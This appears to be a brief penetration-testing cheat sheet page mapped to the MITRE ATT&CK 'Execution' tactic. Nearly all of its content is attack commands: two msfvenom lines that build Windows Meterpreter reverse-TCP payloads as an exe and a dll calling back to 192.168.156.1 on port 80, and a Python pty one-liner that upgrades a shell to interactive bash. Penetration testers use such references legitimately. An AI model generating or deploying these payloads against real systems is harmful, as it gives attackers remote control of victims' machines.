---
layout: post
title: TA0002 Execution
category: Pentesting
parent: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-02-15
permalink: /:categories/:title/
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [Executing System Interpreters](#ExecutingSystemInterpreters)
* [Build System Interpreters - MSFvenom](#BuildSystemInterpreters-MSFvenom)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='BuildSystemInterpreters-MSFvenom'></a>Build System Interpreters - MSFvenom
```sh
#? generate msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```

## <a name='ExecutingSystemInterpreters'></a>Executing System Interpreters 
```sh
# run bash via python
python -c 'import pty; pty.spawn("/bin/bash")'
```
